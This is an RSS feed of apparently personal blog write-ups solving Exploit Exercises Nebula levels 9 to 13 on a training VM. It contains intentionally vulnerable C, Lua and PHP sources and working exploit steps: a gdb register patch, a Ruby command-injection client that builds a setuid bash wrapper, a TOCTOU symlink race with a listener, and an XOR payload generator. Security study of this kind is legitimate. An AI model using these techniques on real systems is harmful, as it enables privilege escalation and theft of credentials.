<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Exercises on Zea&#39;s</title>
    <link>/categories/exercises/</link>
    <description>Recent content in Exercises on Zea&#39;s</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Sun, 26 Jan 2014 21:54:12 +0800</lastBuildDate>
    <atom:link href="/categories/exercises/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Exploit Exercises - Nebula Level 13</title>
      <link>/post/2014-01-26-nebula-level13/</link>
      <pubDate>Sun, 26 Jan 2014 21:54:12 +0800</pubDate>
      
      <guid>/post/2014-01-26-nebula-level13/</guid>
      <description>

&lt;h3 id=&#34;about:d770d09b6be1c937de3594898fdf59fe&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level13&lt;/em&gt; account with the password &lt;em&gt;level13&lt;/em&gt; . Files for this level can be found in /home/flag13.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;source-code:d770d09b6be1c937de3594898fdf59fe&#34;&gt;Source code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
	int c;
	char token[256];

	if(getuid() != FAKEUID) {
		printf(&amp;quot;Security failure detected. UID %d started us, we expect %d\n&amp;quot;, getuid(), FAKEUID);
		printf(&amp;quot;The system administrators will be notified of this violation\n&amp;quot;);
		exit(EXIT_FAILURE);
	}

	// snip, sorry :)

	printf(&amp;quot;your token is %s\n&amp;quot;, token);

}

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;solution:d770d09b6be1c937de3594898fdf59fe&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;There is no way for me to be uid 1000, but this executable which contains the token is right here, we cannot be stopped by a simple &lt;code&gt;if&lt;/code&gt; branch.&lt;/p&gt;

&lt;p&gt;Disassemble the executable &lt;em&gt;flag13&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level13@nebula:~$ objdump -D /home/flag13/flag13 &amp;gt; /home/level13/flag13.asm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go to the instruction corresponding to the last &lt;em&gt;printf()&lt;/em&gt; in the c code, I thought I could read the password out directly from the memory location where &lt;em&gt;token&lt;/em&gt; is stored. Turned out that &lt;em&gt;token&lt;/em&gt; is calculated with mass of code. Well, as I cannot read the password directly, I could always change the execution flow and let the program print that out.&lt;/p&gt;

&lt;p&gt;```text flag13.asm
080484c4 &lt;main&gt;:
 80484c4:       55                      push   %ebp
 80484c5:       89 e5                   mov    %esp,%ebp
 80484c7:       57                      push   %edi
 80484c8:       53                      push   %ebx
 80484c9:       83 e4 f0                and    $0xfffffff0,%esp
 80484cc:       81 ec 30 01 00 00       sub    $0x130,%esp
 80484d2:       8b 45 0c                mov    0xc(%ebp),%eax
 80484d5:       89 44 24 1c             mov    %eax,0x1c(%esp)
 80484d9:       8b 45 10                mov    0x10(%ebp),%eax
 80484dc:       89 44 24 18             mov    %eax,0x18(%esp)
 80484e0:       65 a1 14 00 00 00       mov    %gs:0x14,%eax
 80484e6:       89 84 24 2c 01 00 00    mov    %eax,0x12c(%esp)
 80484ed:       31 c0                   xor    %eax,%eax
 80484ef:       e8 cc fe ff ff          call   80483c0 &lt;a href=&#34;mailto:getuid@plt&#34;&gt;getuid@plt&lt;/a&gt;
 80484f4:       3d e8 03 00 00          cmp    $0x3e8,%eax
 80484f9:       74 36                   je     8048531 &lt;main+0x6d&gt;
 80484fb:       e8 c0 fe ff ff          call   80483c0 &lt;a href=&#34;mailto:getuid@plt&#34;&gt;getuid@plt&lt;/a&gt;
 8048500:       ba d0 86 04 08          mov    $0x80486d0,%edx
 8048505:       c7 44 24 08 e8 03 00    movl   $0x3e8,0x8(%esp)
&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
This is the snippet of function *main()*, note that line 16 compare *%eax* (which is the return value of function call *getuid()*) with *0x3e8*, and line 17 will jump to memory location 0x8048531 if they are equal.

In a normal execution, these are apparantly not equal, but we could make it equal with *gdb*.

1. copy *flag13* into /home/level13
1. start it with *gdb*
1. set a break point at 0x80484f4, which is the instruction to compare
1. run the program
1. modify %eax to 1000 at the break point
1. continue run the program

``` bash
# start flag13 with gdb
level13@nebula:~$ gdb flag13
# set break point and run
(gdb) b *0x80484f4 
Breakpoint 1 at 0x80484f4
(gdb) run
Starting program: /home/level13/flag13
# reach break point, let&#39;s take a look at where we are
Breakpoint 1, 0x080484f4 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x080484e0 &amp;lt;+28&amp;gt;:    mov    %gs:0x14,%eax
   0x080484e6 &amp;lt;+34&amp;gt;:    mov    %eax,0x12c(%esp)
   0x080484ed &amp;lt;+41&amp;gt;:    xor    %eax,%eax
   0x080484ef &amp;lt;+43&amp;gt;:    call   0x80483c0 &amp;lt;getuid@plt&amp;gt;
=&amp;gt; 0x080484f4 &amp;lt;+48&amp;gt;:    cmp    $0x3e8,%eax
   0x080484f9 &amp;lt;+53&amp;gt;:    je     0x8048531 &amp;lt;main+109&amp;gt;
   0x080484fb &amp;lt;+55&amp;gt;:    call   0x80483c0 &amp;lt;getuid@plt&amp;gt;
# here we print the registers out, %eax is 1014
(gdb) i r
eax            0x3f6    1014
ecx            0xbffff804       -1073743868
...
# change %eax
(gdb) set $eax=1000
(gdb) i r
eax            0x3e8    1000
ecx            0xbffff804       -1073743868
...
# continue execution 
(gdb) continue
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 31018) exited with code 063]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now &lt;em&gt;su&lt;/em&gt; to &lt;em&gt;flag13&lt;/em&gt; with the token.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 12</title>
      <link>/post/2014-01-26-nebula-level12/</link>
      <pubDate>Sun, 26 Jan 2014 20:12:53 +0800</pubDate>
      
      <guid>/post/2014-01-26-nebula-level12/</guid>
      <description>

&lt;h3 id=&#34;about:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level12&lt;/em&gt; account with the password &lt;em&gt;level12&lt;/em&gt;. Files for this level can be found in /home/flag12.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;source-code:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;Source code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;-- /home/flag12/flag12.lua 
local socketlocal socket = require(&amp;quot;socket&amp;quot;)
local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001))

function hash(password) 
  prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)
  data = prog:read(&amp;quot;*all&amp;quot;)
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send(&amp;quot;Password: &amp;quot;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
    print(&amp;quot;trying &amp;quot; .. line) -- log from where ;\
    local h = hash(line)

    if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
      client:send(&amp;quot;Better luck next time\n&amp;quot;);
    else
      client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
    end

  end

  client:close()
end
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;solution:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)&lt;/code&gt; this line of code in &lt;em&gt;hash()&lt;/em&gt; function try to calc the hash of the password, but we can execute any command with a well structed &lt;em&gt;password&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Write a simple Ruby script to send command to server, here I construct a &lt;em&gt;password&lt;/em&gt; to make the server build a &lt;em&gt;drop.c&lt;/em&gt; file into directory /home/flag12.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;require &#39;socket&#39;

server = TCPSocket.open(&amp;quot;127.0.0.1&amp;quot;, 50001)
server.puts(&amp;quot;hello &amp;amp;&amp;amp; gcc -o /home/flag12/flag12 /tmp/drop.c &amp;amp;&amp;amp; chmod 777 /home/flag12/flag12 &amp;amp;&amp;amp; chmod +s /home/flag12/flag12 &amp;amp;&amp;amp; echo hello &amp;quot;)
ret = server.gets.chomp
puts &amp;quot;#{ret}&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Remenber the piece of C code we used to drop privilege? Here it is again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* /tmp/drop.c */
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main() {
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  execv(&amp;quot;/bin/bash&amp;quot;, NULL);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run the Ruby script, I got&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level12@nebula:~$ ruby client.rb
Password: Better luck next time
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It is all right, I have no interest in the password anyway. Take a look at the directory /home/flag12&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;flag12@nebula:~$ ll /home/flag12
total 14
drwxr-x--- 1 flag12 level12   60 2014-03-02 22:45 ./
drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ../
-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
-rwsrwsrwx 1 flag12 flag12  7322 2014-03-02 22:45 flag12*
-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is the executable &lt;em&gt;flag12&lt;/em&gt; with Set-User-ID bit, run it and a bash with &lt;em&gt;flag12&lt;/em&gt; user privilege will show up!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 11</title>
      <link>/post/2014-01-26-nebula-level11/</link>
      <pubDate>Sun, 26 Jan 2014 16:44:20 +0800</pubDate>
      
      <guid>/post/2014-01-26-nebula-level11/</guid>
      <description>

&lt;h3 id=&#34;about:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;The &lt;em&gt;/home/flag11/flag11&lt;/em&gt; binary processes standard input and executes a shell command.&lt;/p&gt;

&lt;p&gt;There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level11&lt;/em&gt; account with the password &lt;em&gt;level11&lt;/em&gt; . Files for this level can be found in /home/flag11.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;source-code:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Source code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
	char *tmp;
	int pid;
	int fd;

	srandom(time(NULL));

	tmp = getenv(&amp;quot;TEMP&amp;quot;);
	pid = getpid();

	asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid, 
			 &#39;A&#39; + (random() % 26), &#39;0&#39; + (random() % 10), 
			 &#39;a&#39; + (random() % 26), &#39;A&#39; + (random() % 26),
			 &#39;0&#39; + (random() % 10), &#39;a&#39; + (random() % 26));

	fd = open(*path, O_CREAT|O_RDWR, 0600);
	unlink(*path);
	return fd;
}

void process(char *buffer, int length)
{
	unsigned int key;
	int i;

	key = length &amp;amp; 0xff;

	for(i = 0; i &amp;lt; length; i++) {
		buffer[i] ^= key;
		key -= buffer[i];
	}

	system(buffer);
}

#define CL &amp;quot;Content-Length: &amp;quot;

int main(int argc, char **argv)
{
	char line[256];
	char buf[1024];
	char *mem;
	int length;
	int fd;
	char *path;

	if(fgets(line, sizeof(line), stdin) == NULL) {
		errx(1, &amp;quot;reading from stdin&amp;quot;);
	}

	if(strncmp(line, CL, strlen(CL)) != 0) {
		errx(1, &amp;quot;invalid header&amp;quot;);
	}

	length = atoi(line + strlen(CL));

	if(length &amp;lt; sizeof(buf)) {
		if(fread(buf, length, 1, stdin) != length) {
			err(1, &amp;quot;fread length&amp;quot;);
		}
		process(buf, length);
	} else {
		int blue = length;
		int pink;

		fd = getrand(&amp;amp;path);

		while(blue &amp;gt; 0) {
			printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);

			pink = fread(buf, 1, sizeof(buf), stdin);
			printf(&amp;quot;pink = %d\n&amp;quot;, pink);

			if(pink &amp;lt;= 0) {
				err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
			}
			write(fd, buf, pink);

			blue -= pink;
		}  

		mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
		if(mem == MAP_FAILED) {
			err(1, &amp;quot;mmap&amp;quot;);
		}
		process(mem, length);
	}
}

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;solution:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;In fact I have not passed this one yet, I have met a &lt;strong&gt;problem&lt;/strong&gt; which I will talk about later,
right now I just want to explain my &lt;strong&gt;idea&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The overall function of the program &lt;em&gt;/home/flag11/flag11&lt;/em&gt; is to read some inputs, do some modifications to the inputs and then execute what it gets after the modification.&lt;/p&gt;

&lt;p&gt;More specifically, &lt;em&gt;flag11&lt;/em&gt; requires that the input should match the following pattern:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Content-Length: %d
Content...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;here, depends on the content length &lt;em&gt;%d&lt;/em&gt;, &lt;em&gt;flag11&lt;/em&gt; will go into two branches, if &lt;code&gt;length &amp;lt; sizeof(buf)&lt;/code&gt;,
&lt;em&gt;flag11&lt;/em&gt; would read the content directly into &lt;em&gt;buf&lt;/em&gt; and pass it to &lt;em&gt;process&lt;/em&gt;.
Note that it is required that &lt;code&gt;fread(buf, length, 1, stdin) == length&lt;/code&gt;, so we know that &lt;em&gt;length&lt;/em&gt; must be 1.
(refer to &lt;a href=&#34;http://linux.die.net/man/3/fread&#34;&gt;manpage&lt;/a&gt; of &lt;em&gt;fread()&lt;/em&gt; for details)&lt;/p&gt;

&lt;p&gt;Otherwise if &lt;em&gt;length&lt;/em&gt; is any number larger or equal to 1024, &lt;em&gt;flag11&lt;/em&gt; would buffer the input into a file first,
then pass the content of the file to &lt;em&gt;process&lt;/em&gt;. I think these are the TWO WAYS mentioned in the description.&lt;/p&gt;

&lt;p&gt;The function &lt;em&gt;process&lt;/em&gt; would do some calculation on &lt;em&gt;buf&lt;/em&gt; based on its content using XOR operation.
So if we want to executes some commands like &lt;em&gt;/bin/getflag&lt;/em&gt;, we need to do some reverse calculation and find out
what the origin &lt;em&gt;buf&lt;/em&gt; would be like.&lt;/p&gt;

&lt;h4 id=&#34;way-one:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Way One&lt;/h4&gt;

&lt;p&gt;My first thought was that I could make &lt;em&gt;length&lt;/em&gt; to be 1, and make a soft link to &lt;em&gt;/bin/getflag&lt;/em&gt;, then leverage
&lt;em&gt;flag11&lt;/em&gt; to execute this soft link. I first create a file &lt;em&gt;f.txt&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;``` text f.txt
Content-Length: 1
f&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
You can expect that `&#39;f&#39; ^ (length&amp;amp;&amp;amp;0xff) == &#39;g&#39;`, where *length* is 1.
Then I would execute the following

``` bash
level11@nebula:~$ ln -s /bin/getflag /tmp/g
level11@nebula:~$ export PATH=/tmp/:$PATH


level11@nebula:~$ /home/flag11/flag11 &amp;lt; /home/level11/f.txt
sh: gP,: command not found

level11@nebula:/home/flag11$ ./flag11 &amp;lt; /home/level11/f.txt
sh: $&#39;g\240\030&#39;: command not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Failed. Since each time the output command are different (but the first char &lt;em&gt;g&lt;/em&gt; is correct),
it must be that &lt;em&gt;buf&lt;/em&gt; actually do not have a string terminator &amp;lsquo;\0&amp;rsquo;,
so I tried a few times and finally&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level11@nebula:~$ ../flag11/flag11 &amp;lt; ls.txt
getflag is executing on a non-flag account, this doesn&#39;t count
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well&amp;hellip;here is the &lt;strong&gt;problem&lt;/strong&gt;, the &lt;em&gt;system()&lt;/em&gt; call would not drop privilege on my system&amp;hellip;&lt;/p&gt;

&lt;p&gt;I read the &lt;a href=&#34;http://linux.die.net/man/3/system&#34;&gt;manpage&lt;/a&gt; of &lt;em&gt;system()&lt;/em&gt; carefully, it mentioned that&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Do not use system() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the exec(3) family of functions instead, but not execlp(3) or execvp(3). system() will not, in fact, work properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian uses a modified bash which does not do this when invoked as sh.)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I also did some google and find &lt;a href=&#34;http://www.cplusplus.com/forum/articles/11153/&#34;&gt;this&lt;/a&gt; thread on cplusplus
and &lt;a href=&#34;http://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges&#34;&gt;this&lt;/a&gt;
question on Stackoverflow ot be useful. It is said that &lt;em&gt;system()&lt;/em&gt; itself would not drop privileges,
but Bash 2 would, and my bash is version 4, so I think this meybe the reason.&lt;/p&gt;

&lt;p&gt;I came across an interesting solution for this routine by &lt;a href=&#34;http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-level-11.html&#34;&gt;Reno Robert&lt;/a&gt;, who leveraged &lt;em&gt;LD_PRELOAD&lt;/em&gt; to initialize the buffer.&lt;/p&gt;

&lt;h4 id=&#34;way-two:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Way Two&lt;/h4&gt;

&lt;p&gt;Anyway, before I realized this problem, I did do something through the second way,
to get what the input should be from the output command, I wrote another program &lt;em&gt;gen.c&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;``` c gen.c
void process(char *buffer, int length)
{
        unsigned int key;
        int i;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    key = length &amp;amp; 0xff;

    for(i = 0; i &amp;lt; length; i++) {
            buffer[i] ^= key;
            key -= (key ^ buffer[i]);
    }
    //system(buffer);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;}&lt;/p&gt;

&lt;p&gt;main() {
  char* cmd = &amp;ldquo;getflag&amp;rdquo;;
  char buf[1024];
  int len = strlen(cmd);
  memset((void *)buf, 0, 1024&amp;gt;&amp;gt;2);
  strncpy(buf, cmd, len+1);&lt;/p&gt;

&lt;p&gt;process(buf, 1024);
  printf(&amp;ldquo;Content-Length: 1024\n&amp;rdquo;);
  fwrite(buf, 1024, 1, stdout);
}&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
and after compiling into an executable *gen*, I tried to trigger the exploit like this

``` bash
level11@nebula:~$ ./gen | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn&#39;t count

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;same failure, and after that I changed the &lt;em&gt;cmd&lt;/em&gt; from &amp;ldquo;getflag&amp;rdquo; to &amp;ldquo;id&amp;rdquo; ,
and the output is&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level11@nebula:~$ ./gen | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
uid=1012(level11) gid=1012(level11) groups=1012(level11)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No privilege dropped )=&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 10</title>
      <link>/post/2014-01-25-nebula-level10/</link>
      <pubDate>Sat, 25 Jan 2014 12:40:53 +0800</pubDate>
      
      <guid>/post/2014-01-25-nebula-level10/</guid>
      <description>

&lt;h3 id=&#34;about:14691d9c48d881479fa7a5e0fa8d86be&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;The setuid binary at &lt;em&gt;/home/flag10/flag10&lt;/em&gt; binary will upload any file given, as long as it meets the requirements of the &lt;em&gt;access()&lt;/em&gt; system call.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level10&lt;/em&gt; account with the password &lt;em&gt;level10&lt;/em&gt;. Files for this level can be found in /home/flag10.&lt;/p&gt;

&lt;h3 id=&#34;source-code:14691d9c48d881479fa7a5e0fa8d86be&#34;&gt;Source Code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &amp;lt; 3) {
    printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
    exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
    int fd;
    int ffd;
    int rc;
    struct sockaddr_in sin;
    char buffer[4096];
  	
    printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);
  	
    fd = socket(AF_INET, SOCK_STREAM, 0);
  	
    memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(host);
    sin.sin_port = htons(18211);
  	
    if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
      printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
      exit(EXIT_FAILURE);
    }
  	
#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
      printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
      exit(EXIT_FAILURE);
    }
#undef HITHERE
  
    printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);
  	
    ffd = open(file, O_RDONLY);
    if(ffd == -1) {
      printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
      exit(EXIT_FAILURE);
    }
  	
    rc = read(ffd, buffer, sizeof(buffer));
    if(rc == -1) {
      printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
      exit(EXIT_FAILURE);
    }
  	
    write(fd, buffer, rc);
  	
    printf(&amp;quot;wrote file!\n&amp;quot;);
  } else {
    printf(&amp;quot;You don&#39;t have access to %s\n&amp;quot;, file);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- more --&gt;

&lt;p&gt;There at two files in the directory /home/flag10, &lt;em&gt;flag10&lt;/em&gt; and &lt;em&gt;token&lt;/em&gt;. The source code of executable &lt;em&gt;flag10&lt;/em&gt; in shown above, and &lt;em&gt;token&lt;/em&gt; contains the password of user &lt;em&gt;flag10&lt;/em&gt;. The goal is to read the content of &lt;em&gt;token&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The attack comes from a common bug called &lt;a href=&#34;http://en.wikipedia.org/wiki/Time-of-check-to-time-of-use&#34;&gt;Time of check to time of use&lt;/a&gt;, the Wiki page above explains precisely about what this bug is and how it can be exploited. So in my imagination this is how this attack would look like:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;pass &lt;em&gt;/home/level10/token&lt;/em&gt; whick links to a real user(&lt;em&gt;level10&lt;/em&gt;) readable file &lt;em&gt;/home/level10/test&lt;/em&gt; to the program as &lt;code&gt;argv[1]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;/home/flag10/flag10&lt;/em&gt; checks whether this file is accessable at line 24(with the result true)&lt;/li&gt;
&lt;li&gt;modify the file to link to &lt;em&gt;/home/flag10/token&lt;/em&gt; when &lt;em&gt;/home/flag10/flag10&lt;/em&gt; is executing code between line 24 and line 54&lt;/li&gt;
&lt;li&gt;when &lt;em&gt;/home/flag10/flag10&lt;/em&gt; reads the file at line 54, it reads &lt;em&gt;/home/flag10/token&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The most important step mentioned above is step 3, it is hard to control the time! Fortunately, the &lt;em&gt;flag10&lt;/em&gt; program will send a banner before actually read the file(line 46), this leaves me some time to make some change!&lt;/p&gt;

&lt;p&gt;Notice that the content of the file would be transmit through a socket connection, so I need to write my own server code. In my consideration, I need to change the file &lt;em&gt;/home/level10/token&lt;/em&gt; immediately after the server accepts a connection from the client, I wrote this server code in Ruby:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;require &#39;socket&#39;

server = TCPServer.new(18211)
loop {
    client = server.accept
    `rm /home/level10/token; ln -s /home/flag10/token /home/level10/token`
    while msg = client.gets
        puts &amp;quot;RECV: #{msg}&amp;quot;
    end
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After the server was started, I triggered the vulnerability with the following command&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ /home/flag10/flag10 ~/token 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note that the symbolic file &lt;em&gt;~/token&lt;/em&gt; must exist and point to a file that is readable by user &lt;em&gt;level10&lt;/em&gt; before the program &lt;em&gt;flag10&lt;/em&gt; is executed.&lt;/p&gt;

&lt;p&gt;The output of the Ruby code was not always as expected, sometimes the client read the file before the server changed it, but as long as it could be right, it hacked!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level10@nebula:~$ ruby serv.rb 
RECV: .oO Oo.
RECV: hello world

level10@nebula:~$ ruby serv.rb 
RECV: .oO Oo.
RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 09</title>
      <link>/post/2014-01-24-nebula-level09/</link>
      <pubDate>Fri, 24 Jan 2014 11:43:40 +0800</pubDate>
      
      <guid>/post/2014-01-24-nebula-level09/</guid>
      <description>

&lt;h3 id=&#34;about:e4424096463f5985d9de53dfe658d56b&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;There&amp;rsquo;s a C setuid wrapper for some vulnerable PHP code&amp;hellip;&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level09&lt;/em&gt; account with the password &lt;em&gt;level09&lt;/em&gt;. Files for this level can be found in /home/flag09.&lt;/p&gt;

&lt;h3 id=&#34;source-code:e4424096463f5985d9de53dfe658d56b&#34;&gt;Source code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- more --&gt;

